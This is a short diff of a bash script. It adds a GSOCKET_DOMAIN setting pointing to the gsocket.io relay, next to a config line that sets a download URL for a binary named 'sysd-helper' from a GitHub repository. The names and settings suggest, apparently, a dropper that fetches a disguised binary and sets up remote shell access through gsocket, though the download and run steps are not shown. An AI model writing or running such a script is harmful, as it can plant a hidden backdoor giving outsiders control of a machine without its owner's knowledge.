@@ -1,6 +1,7 @@
 #!/bin/bash
 
 set -u
+export GSOCKET_DOMAIN="gsocket.io" 
 
 # ---- Config ----
 URL="https://github.com/bkahwk-design/sutet/raw/refs/heads/main/sysd-helper"
